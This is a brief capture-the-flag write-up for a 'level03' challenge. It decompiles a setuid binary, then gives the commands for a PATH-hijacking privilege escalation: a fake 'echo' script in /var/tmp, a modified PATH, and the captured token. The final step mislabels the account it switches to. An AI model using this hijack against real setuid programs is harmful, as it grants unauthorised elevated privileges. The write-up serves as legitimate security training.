1. Ls the home

>> -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

We have a file with the -s instead of a -x in the owner column, this means that the program will have flag03 permission no matter the user who launched the program.

2. scp the program to decompile in dogbolt : 

https://dogbolt.org/

``c

int main()
{
    unsigned int v0;  // [bp-0xc]
    unsigned int v1;  // [bp-0x8]

    v0 = getegid();
    v1 = geteuid();
    setresgid(v0, v0, v0);
    setresuid(v1, v1, v1);
    return system("/usr/bin/env echo Exploit me");
}

``

3. We can see that the echo is not called through the absolute path.
Hence we can create our own echo to launch the getflag command and add the path of this script before the /usr/bin where the original echo is located.

4. creation of the personnalized echo command : 

``echo "getflag" > /var/tmp/echo``

And addition of the path /var/tmp to the PATH env variable:

``export PATH=/var/tmp:$PATH``

5. Adding execution permission on our prgm : 

``chmod +x /var/tmp/echo``

6. Launching level03

<< ``./level03``
>> ``Check flag.Here is your token : qi0maab88jeaj46qoumi7maus``

1. Connecting to flag03 and launching getflag

``su level03``
``qi0maab88jeaj46qoumi7maus``
